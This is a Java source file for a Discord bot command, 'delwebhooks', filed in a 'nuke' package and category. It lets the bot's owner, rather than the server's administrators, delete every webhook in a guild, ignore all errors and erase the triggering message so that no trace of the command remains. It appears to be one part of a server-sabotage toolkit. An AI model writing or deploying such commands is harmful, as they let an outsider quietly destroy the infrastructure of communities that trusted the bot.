package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.exceptions.ErrorResponseException;
import net.dv8tion.jda.api.exceptions.HierarchyException;

import java.util.Arrays;
import java.util.List;

public class DeleteWebhooksCommand implements ICommand {
    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID)) {
            return;
        }
        event.getGuild().retrieveWebhooks().queue((webhooks -> {
            int tcSize = webhooks.size();
            try {
                for (int i = 0; i <= tcSize; i++) {
                    try {
                        webhooks.get(i).delete().queue();
                    } catch (HierarchyException | IndexOutOfBoundsException ex1) {
                    }
                }
            } catch (HierarchyException | ErrorResponseException | IndexOutOfBoundsException ex) {

            }
            event.getMessage().delete().queue();

        }));

    }

    @Override
    public String getHelp() {
        return "Deletes all webhooks\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "delwebhooks";
    }

    @Override
    public String[] getAlias() {
        return new String[]{"dweb", "deleteweb", "deletebhook", "deletewebhook"};
    }

     @Override
    public Category getCategory() {
        return Category.NUKE;
    }
}
